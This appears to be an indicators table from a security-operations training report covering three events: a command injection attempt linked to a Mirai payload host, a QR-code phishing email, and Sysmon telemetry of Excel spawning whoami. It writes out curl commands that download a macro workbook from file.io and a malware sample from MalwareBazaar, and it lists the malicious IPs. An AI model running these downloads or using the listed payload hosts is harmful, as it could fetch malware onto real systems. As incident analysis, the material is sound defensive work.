# Indicators

## Event 1 - Command Injection Attempt

| Indicator | Type | Meaning |
|-----------|------|---------|
| `195.1.144.109` | Source IP | External host that sent the HTTP request. |
| [`195.1.144.109` VirusTotal report](https://www.virustotal.com/gui/ip-address/195.1.144.109) | Reputation link | VirusTotal reputation page for the source IP. |
| `195.1.144.109` VirusTotal summary | Reputation context | `2/91` vendors flagged the IP; observed labels include phishing and suspicious. VirusTotal lists AS2116 / Globalconnect AS, Norway. |
| `no4.nordicvm.no` | Source hostname | Hostname associated with the source IP in the log. |
| `65.74.2.33` | Destination IP | Destination web server address in the FortiGate event. |
| `web.seesec.co.il` | Destination hostname | Web service targeted by the request. |
| `103.14.226.142` | Payload host | Host used in the injected `wget` command. |
| [`103.14.226.142` VirusTotal report](https://www.virustotal.com/gui/ip-address/103.14.226.142) | Reputation link | VirusTotal reputation page for the payload host. |
| `103.14.226.142` VirusTotal summary | Reputation context | `10/91` vendors flagged the IP; observed labels include malware, malicious, and phishing. VirusTotal lists AS149136 / AALO.VN DIGITAL TECHNOLOGY JOINT STOCK COMPANY, Vietnam. |
| Public reports for `195.1.144.109` | Source IP reputation | Community reports associate the source IP with web exploit activity, TP-Link probing, port scanning, hacking, SQL injection, and web application attacks. |
| `[GS-455] Mirai Botnet IOCs - SEC-1275-1` | Threat-intelligence context | IOC report that includes the payload host and connects the indicator set to Mirai-style botnet activity. |
| `1275.ru` | Domain from IOC context | Domain shown in the Mirai IOC context screenshot. |
| `Go-http-client/1.1` | User agent | Automated Go HTTP client string observed in the request. |
| `Accept` | FortiGate action | The request was logged as accepted; no explicit block action is shown in this event. |

## Event 2 - Quishing

| Indicator | Type | Meaning |
|-----------|------|---------|
| `avi.waisman@see-security.com` | Sender address | Sender shown in the email. |
| `avi.waisman` | Sender display name | Display name is written like a username instead of a normal full name, which is a weak identity-quality signal. |
| `shaked.shilo@see-secure.com` | Recipient | Targeted recipient shown in the email. |
| `see-security.com` | Sender domain | Known education/training-related domain in this lab context; not treated as malicious from the available evidence. |
| `see-security.com` / `see-secure.com` | Similar domain pattern | Similar-looking domains still require sender validation and full-header review. |
| `https://qr.me-qr.com/shP847fW` | QR URL | Decoded URL from the QR code and intermediate redirect service. |
| `qr.me-qr.com` | QR redirect domain | Me-QR domain reached when the QR code is opened. |
| `cdn.me-qr.com` | QR service CDN | Supporting Me-QR content domain observed in network evidence. |
| `www.facebook.com/?locale=he_IL` | Final observed destination | Legitimate Facebook destination reached after the Me-QR redirect flow. |
| `static.xx.fbcdn.net` / `scontent.xx.fbcdn.net` | Facebook content domains | Facebook content infrastructure observed in the PCAP after the QR redirect. |
| `accounts.meta.com` | Meta domain | Meta infrastructure observed in the PCAP. |
| Google ad and measurement domains | Ad/analytics infrastructure | Domains such as Google ads, Tag Manager, and Analytics are consistent with the Me-QR ad-gated redirect behavior. |

## Event 3 - Sentinel and Sysmon

| Indicator | Type | Meaning |
|-----------|------|---------|
| `WIN10B\Jim` | User and endpoint context | Account and host associated with the activity. |
| `whoami.exe` | Discovery command | Shows current user context; suspicious here because of parent process and repetition. |
| `EventID=1` | Sysmon event type | Process-creation telemetry used to validate that the commands actually executed as processes. |
| `6972`, `3344`, `8388`, `5792` | Process IDs | Four separate `whoami.exe` executions observed in Sentinel/Sysmon. |
| `4836`, `9164`, `2852` | Parent process IDs | Parent process IDs showing the first `whoami` from `cmd.exe` and later executions from Excel. |
| `EXCEL.EXE` | Parent process | Parent process for repeated `whoami` executions. |
| `C:\Users\Jim.WIN10B\Desktop\Gift.xlsm` | Macro-enabled workbook path | Workbook tied to the suspicious Excel parent command line and repeated execution timeline. |
| `curl -o Gift.xlsm https://file.io/atAOsYothaq0` | File transfer command | Repeated download of the macro-enabled workbook from temporary file hosting. |
| `file.io` | Temporary file-sharing domain | Legitimate service that is not malicious by default, but suspicious in this timeline because it is used to retrieve a macro-enabled workbook through `curl`. |
| VirusTotal `file.io` community context | Reputation context | Community notes describe `file.io` as usable for payload hosting or downloader behavior, so the domain requires behavior-based review instead of reputation-only dismissal. |
| `curl -o cmd.xex https://bazaar.abuse.ch/download/69583b9a85076bf1690ef00fceeb77ac998a991375d8ee809ec2fa037f09f3e4/` | File transfer command | Download command pointing to a MalwareBazaar-style path and writing a suspicious executable-like filename. |
| `bazaar.abuse.ch` | MalwareBazaar / abuse.ch domain | Legitimate malware-research and sample-sharing platform; suspicious in this endpoint timeline because `curl` attempts to download from its `/download/` path. |
| VirusTotal `bazaar.abuse.ch` context | Reputation context | Low vendor detection does not clear the event because the domain is associated with malware-sample sharing and community threat-report context. |
| `ping dc`, `ping 10.10.10.10`, `ping dc.local.course` | Network checks | Domain-controller and internal reachability checks observed in the same user timeline. |
| `C:\Users\Jim.WIN10B\Downloads\OfficeSetup.exe` | Elevated installer context | Installer command observed with `ELEVATED` context and user SID. |
| `OneDriveSetup.exe` deletion command | Cleanup or maintenance artifact | `cmd.exe /q /c del /q` command deleting OneDrive updater from the user's profile. |
| `CCleaner` / `cleanmgr` | Cleanup tools | Cleanup-related activity observed later in the timeline. |
